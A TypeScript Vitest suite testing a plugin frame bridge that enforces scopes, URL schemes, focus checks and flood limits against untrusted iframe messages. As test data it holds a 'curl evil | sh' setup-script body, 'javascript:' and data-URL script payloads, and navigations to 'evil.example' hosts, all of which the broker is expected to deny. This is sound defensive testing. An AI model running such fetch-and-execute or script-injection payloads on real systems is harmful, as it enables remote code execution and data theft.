import { afterEach, describe, expect, it, vi } from 'vitest'
import { projectConfigRoute, projectRunTargetsRoute, projectsRoute, tasksRoute } from '@acorn/protocol/api.ts'
import type { PluginBridgeMessage } from '@acorn/protocol/pluginBridge.ts'
import { MAX_DOCUMENT_BYTES, PLUGIN_BRIDGE_DENIED } from '@acorn/protocol/pluginBridge.ts'
import { MAX_PLUGIN_STATE_BYTES } from '@acorn/protocol/pluginState.ts'
import { createFrameBridge, type FrameBinding, type FrameServices } from './broker'

// Over a REAL MessageChannel, not a hand-rolled fake pair: the thing under test is what happens when
// untrusted data arrives on a port, and a fake that only ever delivers well-formed messages would test
// the happy path of the protocol rather than the enforcement.

const BINDING: FrameBinding = {
  pluginId: 'board',
  surface: 'board',
  target: 'pane',
  nodeId: 'node-a',
  taskId: 'task-1',
  api: ['core.tasks:read'],
  events: ['runtime:task-archived'],
  panes: ['board'],
  claimsKeys: [],
}

const CONTEXT = { surface: 'board', target: 'pane' as const, nodeId: 'node-a', taskId: 'task-1', theme: 'dark', style: 'terminal' }

const services = (over: Partial<FrameServices> = {}): FrameServices => ({
  fetch: vi.fn(async () => ({ ok: true, status: 200, body: { fetched: true } })),
  subscribe: vi.fn(() => vi.fn()),
  stateGet: vi.fn(() => undefined),
  stateSet: vi.fn(async () => {}),
  toast: vi.fn(),
  copy: vi.fn(),
  openPane: vi.fn(),
  openUrl: vi.fn(),
  frameHasFocus: vi.fn(() => true),
  importerDone: vi.fn(),
  importerClose: vi.fn(),
  keydown: vi.fn(),
  ...over,
})

type Harness = {
  send(message: unknown): void
  // Every message the host has posted, in order.
  received: PluginBridgeMessage[]
  misbehaved: string[]
  // How many times the host was told the frame is alive. Once, at most, however much it sends.
  connects: number
  dispose(): void
  // Resolves once the host has posted at least `count` messages.
  settled(count: number): Promise<void>
}

const open = (over: Partial<FrameBinding> = {}, svc = services()): Harness & { svc: FrameServices } => {
  const channel = new MessageChannel()
  const received: PluginBridgeMessage[] = []
  const misbehaved: string[] = []
  let connects = 0
  channel.port2.onmessage = (event: MessageEvent) => void received.push(event.data as PluginBridgeMessage)
  const bridge = createFrameBridge({
    port: channel.port1 as unknown as MessagePort,
    binding: { ...BINDING, ...over },
    services: svc,
    context: CONTEXT,
    onMisbehaving: (reason) => void misbehaved.push(reason),
    onConnected: () => void (connects += 1),
  })
  return {
    svc,
    received,
    misbehaved,
    get connects() { return connects },
    send: (message) => channel.port2.postMessage(message),
    dispose: () => {
      bridge.dispose()
      channel.port2.close()
    },
    settled: async (count) => {
      for (let tick = 0; tick < 200 && received.length < count; tick++) await new Promise((r) => setTimeout(r, 1))
    },
  }
}

let harness: (Harness & { svc: FrameServices }) | null = null
const withBridge = (over?: Partial<FrameBinding>, svc?: FrameServices) => (harness = open(over, svc))

afterEach(() => {
  harness?.dispose()
  harness = null
})

const replyTo = (h: Harness, id: number) => h.received.find((message) => 'id' in message && message.id === id)

describe('the handshake', () => {
  it('posts the frame context before anything is asked of it', async () => {
    const h = withBridge()
    await h.settled(1)
    expect(h.received[0]).toEqual({ kind: 'ready', context: CONTEXT })
  })
})

describe('forwarded keybindings', () => {
  it('sends a normalized chord to the host dispatcher without requiring a reply id', async () => {
    const h = withBridge()
    h.send({ kind: 'keydown', chord: 'meta+k' })
    await new Promise((resolve) => setTimeout(resolve, 10))
    expect(h.svc.keydown).toHaveBeenCalledWith('meta+k')
    expect(h.received).toHaveLength(1)
  })

  it('ignores a keydown spelling the shared grammar cannot produce', async () => {
    const h = withBridge()
    h.send({ kind: 'keydown', chord: 'Meta+K' })
    await new Promise((resolve) => setTimeout(resolve, 10))
    expect(h.svc.keydown).not.toHaveBeenCalled()
  })
})

describe('api calls', () => {
  it('forwards a declared read and returns the body', async () => {
    const h = withBridge()
    h.send({ id: 1, kind: 'api', method: 'GET', path: tasksRoute })
    await h.settled(2)
    expect(replyTo(h, 1)).toEqual({ id: 1, ok: true, status: 200, body: { fetched: true } })
    expect(h.svc.fetch).toHaveBeenCalledWith('GET', tasksRoute, undefined, expect.anything())
  })

  it('denies an undeclared path and never reaches the node', async () => {
    const h = withBridge()
    h.send({ id: 2, kind: 'api', method: 'GET', path: '/v2/core/security' })
    await h.settled(2)
    expect(replyTo(h, 2)).toMatchObject({ id: 2, ok: false, error: { code: PLUGIN_BRIDGE_DENIED } })
    // The assertion that matters: a denial is not a discarded response.
    expect(h.svc.fetch).not.toHaveBeenCalled()
  })

  it('denies the project config write even to a frame holding core.projects:write', async () => {
    // The code-execution path. Config writes are shell commands the Node runs on the next task, so this
    // is asserted here as well as in the scope table's own suite.
    const h = withBridge({ target: 'importer', api: ['core.projects:read', 'core.projects:write'] })
    h.send({ id: 3, kind: 'api', method: 'PUT', path: projectConfigRoute('p1'), body: { setup_script: 'curl evil | sh' } })
    h.send({ id: 4, kind: 'api', method: 'PUT', path: projectRunTargetsRoute('p1'), body: {} })
    h.send({ id: 5, kind: 'api', method: 'POST', path: projectsRoute, body: { name: 'ok' } })
    await h.settled(4)
    expect(replyTo(h, 3)).toMatchObject({ ok: false, error: { code: PLUGIN_BRIDGE_DENIED } })
    expect(replyTo(h, 4)).toMatchObject({ ok: false, error: { code: PLUGIN_BRIDGE_DENIED } })
    expect(replyTo(h, 5)).toMatchObject({ ok: true })
    expect(h.svc.fetch).toHaveBeenCalledTimes(1)
    expect(h.svc.fetch).toHaveBeenCalledWith('POST', projectsRoute, { name: 'ok' }, expect.anything())
  })

  it('forwards the node’s own error envelope verbatim', async () => {
    const error = { code: 'revision_conflict', message: 'stale', requestId: 'r7', retryable: false }
    const h = withBridge(undefined, services({ fetch: vi.fn(async () => ({ ok: false, status: 409, body: undefined, error })) }))
    h.send({ id: 6, kind: 'api', method: 'GET', path: tasksRoute })
    await h.settled(2)
    expect(replyTo(h, 6)).toEqual({ id: 6, ok: false, error })
  })

  it('cancels an in-flight request rather than replying to it', async () => {
    let seenSignal: AbortSignal | undefined
    const svc = services({
      fetch: vi.fn((_m, _p, _b, signal: AbortSignal) => {
        seenSignal = signal
        return new Promise<never>(() => {}) // never settles
      }) as unknown as FrameServices['fetch'],
    })
    const h = withBridge(undefined, svc)
    h.send({ id: 7, kind: 'api', method: 'GET', path: tasksRoute })
    await h.settled(1)
    h.send({ id: 8, kind: 'cancel', target: 7 })
    await new Promise((r) => setTimeout(r, 5))
    expect(seenSignal?.aborted).toBe(true)
    expect(replyTo(h, 7)).toBeUndefined()
  })

  it('rejects a request with no method or path', async () => {
    const h = withBridge()
    h.send({ id: 9, kind: 'api', path: tasksRoute })
    await h.settled(2)
    expect(replyTo(h, 9)).toMatchObject({ ok: false, error: { code: 'bad_request' } })
  })
})

describe('events', () => {
  it('attaches a declared channel and forwards its payloads', async () => {
    let listener: ((payload: unknown) => void) | undefined
    const detach = vi.fn()
    const svc = services({
      subscribe: vi.fn((_channel: string, handler: (payload: unknown) => void) => {
        listener = handler
        return detach
      }),
    })
    const h = withBridge(undefined, svc)
    h.send({ id: 10, kind: 'subscribe', channel: 'runtime:task-archived' })
    await h.settled(2)
    expect(replyTo(h, 10)).toMatchObject({ ok: true })
    listener?.({ taskId: 'task-1' })
    await h.settled(3)
    expect(h.received.at(-1)).toEqual({ kind: 'event', channel: 'runtime:task-archived', payload: { taskId: 'task-1' } })
    h.dispose()
    harness = null
    expect(detach).toHaveBeenCalled()
  })

  it('denies a channel the manifest did not declare', async () => {
    const h = withBridge()
    h.send({ id: 11, kind: 'subscribe', channel: 'runtime:node-removed' })
    await h.settled(2)
    expect(replyTo(h, 11)).toMatchObject({ ok: false, error: { code: PLUGIN_BRIDGE_DENIED } })
    expect(h.svc.subscribe).not.toHaveBeenCalled()
  })

  it('attaches a channel once however often it is asked', async () => {
    const h = withBridge()
    h.send({ id: 12, kind: 'subscribe', channel: 'runtime:task-archived' })
    h.send({ id: 13, kind: 'subscribe', channel: 'runtime:task-archived' })
    await h.settled(3)
    expect(h.svc.subscribe).toHaveBeenCalledTimes(1)
    expect(replyTo(h, 13)).toMatchObject({ ok: true })
  })
})

describe('state', () => {
  it('namespaces every key by plugin id', async () => {
    const h = withBridge()
    h.send({ id: 14, kind: 'state.set', key: 'columns', value: [1, 2] })
    await h.settled(2)
    expect(h.svc.stateSet).toHaveBeenCalledWith('plugin:board:columns', [1, 2])
    h.send({ id: 15, kind: 'state.get', key: 'columns' })
    await h.settled(3)
    expect(h.svc.stateGet).toHaveBeenCalledWith('plugin:board:columns')
  })

  it('refuses a value over the quota without calling the writer', async () => {
    const h = withBridge()
    h.send({ id: 16, kind: 'state.set', key: 'big', value: 'x'.repeat(MAX_PLUGIN_STATE_BYTES + 1) })
    await h.settled(2)
    expect(replyTo(h, 16)).toMatchObject({ ok: false, error: { code: 'bad_request' } })
    expect(h.svc.stateSet).not.toHaveBeenCalled()
  })
})

describe('ui verbs', () => {
  it('runs the ones the host owns', async () => {
    const h = withBridge()
    h.send({ id: 17, kind: 'ui', op: 'toast', title: '3 cards dispatched' })
    h.send({ id: 18, kind: 'ui', op: 'copy', text: 'abc' })
    h.send({ id: 19, kind: 'ui', op: 'openPane', paneId: 'board' })
    await h.settled(4)
    expect(h.svc.toast).toHaveBeenCalledWith('3 cards dispatched', undefined)
    expect(h.svc.copy).toHaveBeenCalledWith('abc')
    expect(h.svc.openPane).toHaveBeenCalledWith('board')
  })

  it('denies opening a pane the plugin did not contribute', async () => {
    const h = withBridge()
    h.send({ id: 20, kind: 'ui', op: 'openPane', paneId: 'pr' })
    await h.settled(2)
    expect(replyTo(h, 20)).toMatchObject({ ok: false, error: { code: PLUGIN_BRIDGE_DENIED } })
    expect(h.svc.openPane).not.toHaveBeenCalled()
  })

  it('rejects the importer verbs from a pane surface', async () => {
    const h = withBridge()
    h.send({ id: 21, kind: 'ui', op: 'importer.done' })
    h.send({ id: 22, kind: 'ui', op: 'importer.close' })
    await h.settled(3)
    expect(replyTo(h, 21)).toMatchObject({ ok: false, error: { code: PLUGIN_BRIDGE_DENIED } })
    expect(replyTo(h, 22)).toMatchObject({ ok: false, error: { code: PLUGIN_BRIDGE_DENIED } })
    expect(h.svc.importerDone).not.toHaveBeenCalled()
  })

  it('accepts them from an importer surface', async () => {
    const h = withBridge({ target: 'importer' })
    h.send({ id: 23, kind: 'ui', op: 'importer.done' })
    await h.settled(2)
    expect(h.svc.importerDone).toHaveBeenCalled()
  })

  it('lets an overlay dismiss itself but not run the host’s import refresh', async () => {
    // A picker's whole gesture is "pick, then get out of the way", so `close` is the one of the pair an
    // overlay gets. `done` means "the host re-reads its projects", which an overlay never imported into.
    const h = withBridge({ target: 'overlay' })
    h.send({ id: 26, kind: 'ui', op: 'importer.close' })
    h.send({ id: 27, kind: 'ui', op: 'importer.done' })
    await h.settled(3)
    expect(h.svc.importerClose).toHaveBeenCalled()
    expect(h.svc.importerDone).not.toHaveBeenCalled()
    expect(replyTo(h, 27)).toMatchObject({ ok: false, error: { code: PLUGIN_BRIDGE_DENIED } })
  })

  it('hands an https URL to the host without telling the frame where it went', async () => {
    const h = withBridge()
    h.send({ id: 25, kind: 'ui', op: 'openUrl', url: 'https://github.com/runn/acorn/pull/1' })
    await h.settled(2)
    expect(h.svc.openUrl).toHaveBeenCalledWith('https://github.com/runn/acorn/pull/1')
    // `ok` with an empty body. Whether the host resolved it in-app or opened the browser is the host's
    // business, and reporting it would tell a frame where the reader was sent.
    expect(replyTo(h, 25)).toMatchObject({ ok: true, body: null })
  })

  it('refuses every scheme but https, before the host is asked', async () => {
    // The frame is untrusted input on its way to the navigation layer. `file:` and `javascript:` are the
    // arbitrary-launch and script-execution cases; `http:` is a downgrade a plugin does not get to pick
    // for the owner; `app-plugin://` is another plugin's bundle origin, which is why a scheme allowlist
    // rather than a denylist is the right shape here.
    const refused = [
      'file:///Applications/Calculator.app',
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'http://internal.example/',
      'app-plugin://abc123/index.html',
      '//evil.example.com/',
      'not a url',
      '',
    ]
    const h = withBridge()
    refused.forEach((url, index) => h.send({ id: 30 + index, kind: 'ui', op: 'openUrl', url }))
    h.send({ id: 40, kind: 'ui', op: 'openUrl' })
    await h.settled(refused.length + 2)
    for (let index = 0; index < refused.length; index++) {
      expect(replyTo(h, 30 + index), refused[index]).toMatchObject({ ok: false, error: { code: PLUGIN_BRIDGE_DENIED } })
    }
    expect(replyTo(h, 40)).toMatchObject({ ok: false, error: { code: PLUGIN_BRIDGE_DENIED } })
    expect(h.svc.openUrl).not.toHaveBeenCalled()
  })

  it('refuses openUrl while the frame is not focused', async () => {
    // A navigation is a person's act. A click or keypress inside the frame's document focuses the
    // iframe, so a frame whose document does NOT hold focus is code acting on its own — a background
    // surface must not be able to move the reader.
    const h = withBridge({}, services({ frameHasFocus: vi.fn(() => false) }))
    h.send({ id: 50, kind: 'ui', op: 'openUrl', url: 'https://github.com/runn/acorn/pull/1' })
    await h.settled(2)
    expect(replyTo(h, 50)).toMatchObject({ ok: false, error: { code: PLUGIN_BRIDGE_DENIED } })
    expect(h.svc.openUrl).not.toHaveBeenCalled()
  })

  it('throttles a second openUrl inside the minimum gap', async () => {
    // The focus check is a raised bar, not a wall — a visible frame's own script can pull focus to
    // itself — so the throttle is what caps how fast a hostile frame can push the reader around.
    const h = withBridge()
    h.send({ id: 51, kind: 'ui', op: 'openUrl', url: 'https://github.com/runn/acorn/pull/1' })
    h.send({ id: 52, kind: 'ui', op: 'openUrl', url: 'https://github.com/runn/acorn/pull/2' })
    await h.settled(3)
    expect(replyTo(h, 51)).toMatchObject({ ok: true })
    expect(replyTo(h, 52)).toMatchObject({ ok: false, error: { code: PLUGIN_BRIDGE_DENIED } })
    expect(h.svc.openUrl).toHaveBeenCalledTimes(1)
  })

  it('survives an effect that disposes the bridge, which is what a refPanel swap does', async () => {
    // Not gated by surface, unlike the importer verbs: every frame renders content and every frame's
    // content can contain a link. The refPanel case is the interesting one because resolving the link
    // can replace the panel this frame IS — so the host's handler tears the port down from inside the
    // call, and the broker must not fall over or keep answering afterwards.
    const svc = services()
    const h = withBridge({ target: 'refPanel', taskId: undefined }, svc)
    svc.openUrl = vi.fn(() => h.dispose())
    h.send({ id: 26, kind: 'ui', op: 'openUrl', url: 'https://linear.app/acme/issue/ENG-42' })
    h.send({ id: 27, kind: 'ui', op: 'copy', text: 'after the teardown' })
    await h.settled(2)
    expect(svc.openUrl).toHaveBeenCalledWith('https://linear.app/acme/issue/ENG-42')
    expect(svc.copy).not.toHaveBeenCalled()
  })

  it('rejects a verb outside the closed set', async () => {
    const h = withBridge()
    h.send({ id: 24, kind: 'ui', op: 'eval', code: 'nope' })
    await h.settled(2)
    expect(replyTo(h, 24)).toMatchObject({ ok: false, error: { code: 'bad_request' } })
  })
})

describe('webview verbs', () => {
  it('forwards navigation only from the bound webview and only inside its hosts', async () => {
    const svc = services({ webviewNavigate: vi.fn(async () => true) })
    const h = withBridge({ target: 'webview', hosts: ['docs.example.com'] }, svc)
    h.send({ id: 30, kind: 'webview', op: 'navigate', url: 'https://docs.example.com/guide' })
    await h.settled(2)
    expect(replyTo(h, 30)).toMatchObject({ ok: true })
    expect(svc.webviewNavigate).toHaveBeenCalledWith('https://docs.example.com/guide')
  })

  it('denies an outside host before it reaches the native view service', async () => {
    const svc = services({ webviewNavigate: vi.fn(async () => true) })
    const h = withBridge({ target: 'webview', hosts: ['docs.example.com'] }, svc)
    h.send({ id: 31, kind: 'webview', op: 'navigate', url: 'https://evil.example/collect' })
    await h.settled(2)
    expect(replyTo(h, 31)).toMatchObject({ ok: false, error: { code: PLUGIN_BRIDGE_DENIED } })
    expect(svc.webviewNavigate).not.toHaveBeenCalled()
  })

  it('derives the surface from the binding and refuses a normal pane', async () => {
    const svc = services({ webviewCommand: vi.fn(async () => true) })
    const h = withBridge({ target: 'pane', hosts: ['docs.example.com'] }, svc)
    h.send({ id: 32, kind: 'webview', op: 'reload' })
    await h.settled(2)
    expect(replyTo(h, 32)).toMatchObject({ ok: false, error: { code: PLUGIN_BRIDGE_DENIED } })
    expect(svc.webviewCommand).not.toHaveBeenCalled()
  })
})

describe('the shared document', () => {
  // A composed pane's frame reaching the editor beside it. The permission check is STRUCTURAL rather
  // than a declared scope — a frame either has a document beside it or it does not, and which one is a
  // fact about the manifest the host already read — so the absence of `services.document` is the whole
  // gate, and that is what these pin.
  const doc = (over: Partial<NonNullable<FrameServices['document']>> = {}) => ({
    read: vi.fn(() => 'SELECT 1;'),
    write: vi.fn(),
    flush: vi.fn(async () => {}),
    ...over,
  })

  it('reads, writes and flushes for a frame the host gave a document to', async () => {
    const document = doc()
    const h = withBridge({}, services({ document }))
    h.send({ id: 40, kind: 'document', op: 'read' })
    await h.settled(2)
    expect(replyTo(h, 40)).toMatchObject({ ok: true, body: { text: 'SELECT 1;' } })

    h.send({ id: 41, kind: 'document', op: 'write', text: 'SELECT 2;' })
    await h.settled(3)
    expect(replyTo(h, 41)).toMatchObject({ ok: true })
    expect(document.write).toHaveBeenCalledWith('SELECT 2;')

    h.send({ id: 42, kind: 'document', op: 'flush' })
    await h.settled(4)
    expect(replyTo(h, 42)).toMatchObject({ ok: true })
    expect(document.flush).toHaveBeenCalled()
  })

  it('denies every operation to a frame with no document beside it', async () => {
    const h = withBridge()
    h.send({ id: 43, kind: 'document', op: 'read' })
    await h.settled(2)
    expect(replyTo(h, 43)).toMatchObject({ ok: false, error: { code: PLUGIN_BRIDGE_DENIED } })
  })

  it('holds a write to the same ceiling the read path enforces', async () => {
    const document = doc()
    const h = withBridge({}, services({ document }))
    h.send({ id: 44, kind: 'document', op: 'write', text: 'x'.repeat(MAX_DOCUMENT_BYTES + 1) })
    await h.settled(2)
    expect(replyTo(h, 44)).toMatchObject({ ok: false, error: { code: 'bad_request' } })
    expect(document.write).not.toHaveBeenCalled()
  })

  it('reports a failing flush rather than dropping it, so a frame can say the save did not land', async () => {
    const document = doc({ flush: vi.fn(async () => { throw new Error('write route 500') }) })
    const h = withBridge({}, services({ document }))
    h.send({ id: 45, kind: 'document', op: 'flush' })
    await h.settled(2)
    expect(replyTo(h, 45)).toMatchObject({ ok: false, error: { code: 'internal', message: 'write route 500' } })
  })
})

describe('malformed and hostile traffic', () => {
  it('ignores anything without a usable request id', async () => {
    const h = withBridge()
    await h.settled(1)
    for (const junk of [null, 'string', 42, [], { kind: 'api' }, { id: 0, kind: 'api' }, { id: -1, kind: 'api' }]) {
      h.send(junk)
    }
    await new Promise((r) => setTimeout(r, 10))
    expect(h.received).toHaveLength(1) // still just the ready message
  })

  it('reports the frame alive on its first message, and only once', async () => {
    // The host's handshake deadline hangs off this: a bundle that throws at module scope never sends
    // anything, and the surface becomes a labelled placeholder instead of a blank rectangle.
    const h = withBridge()
    await h.settled(1)
    expect(h.connects).toBe(0)
    // The SDK's ack. Not a request — no id — so it is consumed here and never answered.
    h.send({ kind: 'connected' })
    await new Promise((r) => setTimeout(r, 10))
    expect(h.connects).toBe(1)
    expect(h.received).toHaveLength(1) // still just the ready message
    h.send({ id: 30, kind: 'ui', op: 'copy', text: 'x' })
    await h.settled(2)
    expect(h.connects).toBe(1)
  })

  it('rejects an unknown message kind', async () => {
    const h = withBridge()
    h.send({ id: 25, kind: 'exec' })
    await h.settled(2)
    expect(replyTo(h, 25)).toMatchObject({ ok: false, error: { code: 'bad_request' } })
  })

  it('drops the port when a frame floods it', async () => {
    const h = withBridge()
    for (let i = 1; i <= 1100; i++) h.send({ id: i, kind: 'ui', op: 'copy', text: 'x' })
    for (let tick = 0; tick < 400 && h.misbehaved.length === 0; tick++) await new Promise((r) => setTimeout(r, 1))
    expect(h.misbehaved[0]).toContain('bridge messages')
    // The shell stops answering rather than keeping up: nothing after the kill is processed.
    const answered = h.received.filter((message) => 'id' in message).length
    expect(answered).toBeLessThanOrEqual(1000)
  })

  it('stops answering once disposed', async () => {
    const h = withBridge()
    await h.settled(1)
    h.dispose()
    harness = null
    h.send({ id: 26, kind: 'ui', op: 'copy', text: 'x' })
    await new Promise((r) => setTimeout(r, 10))
    expect(h.svc.copy).not.toHaveBeenCalled()
  })
})
